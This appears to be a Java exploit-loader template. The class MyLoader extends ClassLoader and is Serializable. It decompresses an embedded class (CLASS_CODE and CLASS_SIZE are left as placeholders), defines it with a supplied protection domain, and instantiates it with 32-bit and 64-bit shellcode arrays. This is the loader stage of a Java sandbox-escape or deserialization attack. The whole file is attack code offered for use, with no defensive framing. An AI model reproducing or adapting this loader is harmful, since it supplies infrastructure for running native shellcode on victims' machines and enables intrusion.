import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.io.ByteArrayInputStream;
import java.lang.reflect.*;
import java.lang.Class;

public class MyLoader extends ClassLoader implements Serializable {
    // private static final long serialVersionUID = -4133590411905026539L;

    static byte[] clase = {
// CLASS_CODE
    };

// CLASS_SIZE

    public static void conFoosedLoad(MyLoader ldr, B m, byte[] shellcode32, byte[] shellcode64) throws Exception {
        byte[] uclass = m.uncomp(clase, uclass_size);
        Class caca = ldr.defineClass("A", uclass, 0, uclass.length, m.getPD());
        Constructor c[] = caca.getDeclaredConstructors();
        Object initargs[] = new Object[2];
        initargs[0] = shellcode32;
        initargs[1] = shellcode64;
        System.out.println("1");
        c[0].newInstance(initargs);
        System.out.println("2");
    }

    public static void conFoosedLoad(ClassLoader ldr, Method meth, B m, byte[] shellcode32, byte[] shellcode64)
            throws Exception {
        Object[] args = new Object[5];
        byte[] uclass = m.uncomp(clase, uclass_size);
        args[0] = new String("A");
        args[1] = uclass;
        args[2] = 0;
        args[3] = uclass.length;
        args[4] = m.getPD();
        Class caca = (Class) meth.invoke(ldr, args);
        Constructor c[] = caca.getDeclaredConstructors();
        Object initargs[] = new Object[2];
        initargs[0] = shellcode32;
        initargs[1] = shellcode64;
        System.out.println("1");
        c[0].newInstance(initargs);
        System.out.println("2");
    }
}
